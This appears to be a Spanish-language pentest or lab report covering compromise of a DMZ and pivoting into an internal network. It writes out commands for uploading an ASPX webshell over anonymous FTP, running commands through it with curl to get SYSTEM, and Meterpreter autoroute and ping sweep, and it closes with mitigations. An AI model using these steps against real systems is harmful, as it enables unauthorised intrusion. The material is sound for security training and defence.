Resumen Ejecutivo

Se realizó una evaluación de seguridad ofensiva sobre una infraestructura compuesta por una red DMZ (192.168.100.0/24) con 7 hosts y una red interna (192.168.0.0/24) accesible únicamente mediante pivoting. Se comprometieron 5 sistemas con niveles de acceso máximo (SYSTEM/root) utilizando vectores heterogéneos: explotación de CMS vulnerables, upload anónimo FTP, fuerza bruta de credenciales SMB y escalada de privilegios post-explotación.

El host WINSERVER-03 actuó como host dual-homed permitiendo el pivoting hacia la red interna donde se descubrieron 3 hosts adicionales, uno de ellos con Webmin vulnerable (puerto 10000).

⚠ Hallazgo Crítico — CVE-2018-7600 (CVSS 9.8)

Drupalgeddon2 permite RCE sin autenticación en el servidor Linux (.52). Acceso como www-data con escalada a lectura de credenciales MySQL y SSH. Parchear inmediatamente a Drupal ≥ 7.58 / 8.x ≥ 8.5.1.

Paso 1 — ARP Scan

Descubrimiento de hosts en la DMZ

¿Por qué ARP Scan?

ARP es más rápido y fiable que ICMP en redes locales. Descubre todos los hosts activos en la subred independientemente de reglas de firewall que bloqueen ping.

arp-scan -I eth1 --localnet
-I eth1 → interfaz de red hacia la DMZ
--localnet → escanear toda la subred local automáticamente

Explotación — WINSERVER-02 (192.168.100.51)

Vector de ataque
✅ FTP Anónimo → Upload Webshell ASPX → Command Injection (NT AUTHORITY\SYSTEM)
Paso 1 — Enumeración FTP Anónimo

Acceso FTP sin credenciales

ftp 192.168.100.51 # usuario: anonymous | pass: [vacío]
Hallazgos
  • FTP anónimo habilitado con permisos de WRITE en directorio web raíz
  • Archivo updates.txt encontrado con información de infraestructura interna
  • Directorio raíz de IIS accesible → permite subir archivos ejecutables
Paso 2 — Upload de Webshell ASPX

Subida de cmdasp.aspx via FTP

ftp> put cmdasp.aspx
Decisión tomada

Subir cmdasp.aspx (webshell ASPX de Kali) al directorio raíz de IIS. El robots.txt.txt confirma la ruta: Disallow: /cmdasp.aspx

Paso 3 — Ejecución de Comandos

Command injection via webshell

curl -X POST "http://192.168.100.51/cmdasp.aspx" --data "txtArg=whoami&testing=excute&[VIEWSTATE]"
Output
nt authority\system
Resultado
  • Acceso como NT AUTHORITY\SYSTEM — privilegios máximos en Windows
  • Vulnerabilidad clasificada como OS Command Injection via webshell
  • IIS ejecuta el pool de aplicaciones como SYSTEM por mala configuración

Pivoting — Red Interna (192.168.0.0/24)

Técnica
✅ Autoroute + Ping Sweep → Descubrimiento de 3 hosts internos

WINSERVER-03 es un host dual-homed: tiene IP en DMZ (192.168.100.55) y en la red interna (192.168.0.50). Esto lo convierte en el pivote ideal para alcanzar la red interna no accesible desde la DMZ.

Paso 1 — Autoroute

Establecer ruta a través de la sesión Meterpreter

meterpreter > run post/multi/manage/autoroute SUBNET=192.168.0.0/24
Paso 2 — Ping Sweep

Descubrimiento de hosts en red interna

msf6 use post/multi/gather/ping_sweep RHOSTS=192.168.0.1-254 SESSION=2
Hosts internos descubiertos
192.168.0.1   → Gateway interno
192.168.0.50  → WINSERVER-03 (ya comprometido, dual-homed)
192.168.0.51  → Host interno: 22/SSH 80/HTTP 3389/RDP 10000/Webmin ← VULNERABLE
192.168.0.57  → Host interno: 22/SSH únicamente

⚠ Webmin en puerto 10000 — Host 192.168.0.51

Webmin tiene múltiples CVEs críticos de RCE (CVE-2019-15107, CVE-2022-0824). No accesible desde DMZ — requiere pivoting. Vector de escalada pendiente de explotar.

Lecciones Aprendidas

⚔ Lecciones Ofensivas

  • FTP anónimo + IIS = upload directo de webshell
  • CMS desactualizados = RCE en minutos (Drupal, WordPress)
  • Reutilización de contraseñas entre servicios (swordfish en SMB)
  • Dual-homed hosts como pivot natural hacia redes internas
  • Hashdump + john/hashcat para crackear NTLM offline
  • robots.txt expone rutas sensibles (cmdasp.aspx)
  • WebDAV habilitado en IIS amplía superficie de ataque

🛡 Mitigaciones / Defensas

  • Deshabilitar FTP anónimo o restringir permisos de escritura
  • Mantener CMS actualizados (Drupal ≥ 8.9, WordPress latest)
  • Política de contraseñas únicas por servicio
  • Segmentar hosts dual-homed con firewall estricto
  • Monitorizar intentos de hashdump con EDR/SIEM
  • Eliminar robots.txt que exponga rutas de admin
  • Deshabilitar WebDAV si no es necesario en IIS
